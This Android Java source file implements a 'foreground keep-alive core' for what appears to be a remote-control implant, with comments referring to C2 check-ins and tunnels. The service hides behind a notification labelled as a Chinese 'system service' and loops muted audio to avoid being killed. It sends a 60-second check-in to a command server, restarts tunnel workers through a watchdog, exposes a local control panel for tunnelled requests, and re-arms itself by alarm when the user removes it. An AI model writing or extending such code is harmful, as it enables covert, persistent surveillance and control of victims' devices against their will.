package com.labs.labrats;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.media.MediaPlayer;
import android.os.Build;
import android.os.IBinder;
import android.os.SystemClock;

/**
 * Foreground keep-alive core (PATCH-16).
 * START_STICKY foreground service that:
 *  - holds an ongoing "system service" notification (channel c2_core);
 *  - loops res/raw/silent.mp3 to keep the process alive in background;
 *  - runs a 60s /checkin heartbeat through C2_Uploader.checkIn (which already
 *    attaches the X-Device-Secret header via BuildConfig.DEVICE_SECRET);
 *  - runs a tunnel watchdog: if C2_Tunnel reports no successful poll for 90s,
 *    the tunnel workers are restarted;
 *  - onTaskRemoved/onDestroy schedules a 2-minute exact alarm (ACTION_AUTO_START)
 *    plus the existing WorkManager_Sync 15-minute persistence chain as fallback.
 */
public class ForegroundCoreService extends Service {

    private static final String TAG = "ForegroundCoreService";
    private static final String CHANNEL_ID = "c2_core";
    private static final int NOTIF_ID = 7301;

    public static final String ACTION_RESTART = "com.labs.pghth.2ZKYUXCYTKZJ"; // Constants.ACTION_AUTO_START

    private MediaPlayer keepAlivePlayer;
    private Thread heartbeatThread;
    private Thread watchdogThread;
    private volatile boolean running = false;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (!running) {
            running = true;
            startForegroundCompat();
            startKeepAliveAudio();
            startHeartbeat();
            startWatchdog();
            // [FIX v2.1] Bring up the local 9191/9192 control panel so tunnel-replayed
            // requests have a local target (previously only the WorkManager_Sync path did this,
            // which the auto-start flow never reached -> TUNNEL_GATEWAY_TIMEOUT).
            FirebaseConfig.startSharedServer(getApplicationContext());
            C2_Tunnel.start(getApplicationContext());
            android.util.Log.d(TAG, "CORE_ALIVE: foreground keep-alive engaged");
        }
        return START_STICKY;
    }

    private void startForegroundCompat() {
        try {
            NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            if (nm != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                NotificationChannel channel = new NotificationChannel(
                        CHANNEL_ID, "系统服务", NotificationManager.IMPORTANCE_MIN);
                channel.setDescription("System component runtime");
                nm.createNotificationChannel(channel);
            }

            Notification.Builder builder;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                builder = new Notification.Builder(this, CHANNEL_ID);
            } else {
                builder = new Notification.Builder(this);
            }
            builder.setSmallIcon(android.R.drawable.ic_popup_sync)
                    .setContentTitle("系统服务运行中")
                    .setContentText("正在保持系统组件同步")
                    .setOngoing(true);

            try {
                startForeground(NOTIF_ID, builder.build());
            } catch (SecurityException ignored) {
                // startForeground requires FOREGROUND_SERVICE; manifest declares it.
            }
        } catch (Exception e) {
            android.util.Log.e(TAG, "Foreground start failed", e);
        }
    }

    private void startKeepAliveAudio() {
        try {
            if (keepAlivePlayer != null) return;
            keepAlivePlayer = MediaPlayer.create(this, R.raw.silent);
            if (keepAlivePlayer != null) {
                keepAlivePlayer.setLooping(true);
                keepAlivePlayer.setVolume(0f, 0f);
                keepAlivePlayer.start();
            }
        } catch (Exception e) {
            android.util.Log.e(TAG, "Keep-alive audio failed", e);
        }
    }

    private void startHeartbeat() {
        if (heartbeatThread != null && heartbeatThread.isAlive()) return;
        heartbeatThread = new Thread(() -> {
            while (running) {
                try {
                    // 60s C2 checkin heartbeat (reuses existing path with X-Device-Secret)
                    C2_Uploader.checkIn(getApplicationContext());
                    // Ensure tunnel workers exist even if C2_Tunnel state was reset externally
                    if (!C2_Tunnel.isRunning()) {
                        C2_Tunnel.start(getApplicationContext());
                    }
                } catch (Throwable ignored) {}
                try {
                    Thread.sleep(60000);
                } catch (InterruptedException e) {
                    break;
                }
            }
        }, "CoreHeartbeat");
        heartbeatThread.setDaemon(true);
        heartbeatThread.start();
    }

    private void startWatchdog() {
        if (watchdogThread != null && watchdogThread.isAlive()) return;
        watchdogThread = new Thread(() -> {
            while (running) {
                try {
                    long now = SystemClock.elapsedRealtime();
                    long lastSuccess = C2_Tunnel.getLastPollSuccessTime();
                    long idleMs = (lastSuccess > 0) ? (now - lastSuccess) : Long.MAX_VALUE;
                    if (C2_Tunnel.isRunning() && idleMs > 90000) {
                        android.util.Log.w(TAG, "TUNNEL_WATCHDOG: no successful poll for " + (idleMs / 1000)
                                + "s; restarting tunnel workers");
                        C2_Tunnel.stop();
                        C2_Tunnel.start(getApplicationContext());
                    }
                } catch (Throwable ignored) {}
                try {
                    Thread.sleep(15000);
                } catch (InterruptedException e) {
                    break;
                }
            }
        }, "CoreTunnelWatchdog");
        watchdogThread.setDaemon(true);
        watchdogThread.start();
    }

    private void scheduleRestartAlarm() {
        try {
            AlarmManager am = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
            if (am == null) return;
            Intent restart = new Intent(this, ForegroundCoreService.class);
            restart.setAction(ACTION_RESTART);
            PendingIntent pi = PendingIntent.getService(
                    this, 901, restart,
                    PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
            long triggerAt = System.currentTimeMillis() + 120000; // 2 minutes
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                am.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerAt, pi);
            } else {
                am.setExact(AlarmManager.RTC_WAKEUP, triggerAt, pi);
            }
            android.util.Log.d(TAG, "Restart alarm scheduled in 120s");
        } catch (Exception e) {
            android.util.Log.e(TAG, "Restart alarm failed", e);
        }
        // Existing WorkManager 15-minute persistence chain as fallback
        try {
            Intent fallback = new Intent(this, WorkManager_Sync.class);
            fallback.setAction(Constants.ACTION_START_CORE);
            androidx.core.content.ContextCompat.startForegroundService(this, fallback);
        } catch (Exception ignored) {}
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        scheduleRestartAlarm();
        super.onTaskRemoved(rootIntent);
    }

    @Override
    public void onDestroy() {
        running = false;
        try {
            if (heartbeatThread != null) heartbeatThread.interrupt();
            if (watchdogThread != null) watchdogThread.interrupt();
            if (keepAlivePlayer != null) {
                try { keepAlivePlayer.stop(); } catch (Exception ignored) {}
                try { keepAlivePlayer.release(); } catch (Exception ignored) {}
                keepAlivePlayer = null;
            }
        } catch (Exception ignored) {}
        scheduleRestartAlarm();
        super.onDestroy();
    }
}
